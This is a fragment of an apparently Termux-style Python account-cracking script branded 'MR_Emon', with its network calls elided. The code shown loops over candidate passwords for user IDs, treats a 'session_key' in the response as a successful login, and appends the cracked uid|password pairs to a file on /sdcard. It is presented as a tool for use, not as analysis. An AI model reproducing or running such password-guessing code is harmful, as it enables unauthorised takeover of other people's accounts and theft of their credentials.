...
\033[38;5;46m| $$$    /$$$| $$__  $$       | $$_____/                                  
\033[38;5;46m| $$$$  /$$$$| $$  \ $$       | $$       /$$$$$$/$$$$   /$$$$$$  /$$$$$$$ \033[38;5;46m
\033[38;5;46m| $$ $$/$$ $$| $$$$$$$/       | $$$$$   | $$_  $$_  $$ /$$__  $$| $$__  $$\033[38;5;46m
\033[38;5;46m| $$  $$$| $$| $$__  $$       | $$__/   | $$ \ $$ \ $$| $$  \ $$| $$  \ $$\033[38;5;46m
\033[38;5;46m| $$\  $ | $$| $$  \ $$       | $$      | $$ | $$ | $$| $$  | $$| $$  | $$\033[38;5;46m
\033[38;5;46m| $$ \/  | $$| $$  | $$       | $$$$$$$$| $$ | $$ | $$|  $$$$$$/| $$  | $$\033[38;5;46m
\033[38;5;46m|__/     |__/|__/  |__//$$$$$$|________/|__/ |__/ |__/ \______/ |__/  |__/
                      |______/    \033[38;5;46m                                        
...
def auto_pass(fileeee):
    ...
    print(cox)
    print("  [✓] Id Save: /sdcard/MR_Emon.txt")
    print(cox)
...
def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[MR_Emon] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "session_key" in q:
                ...
                open("/sdcard/MR_Emon-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
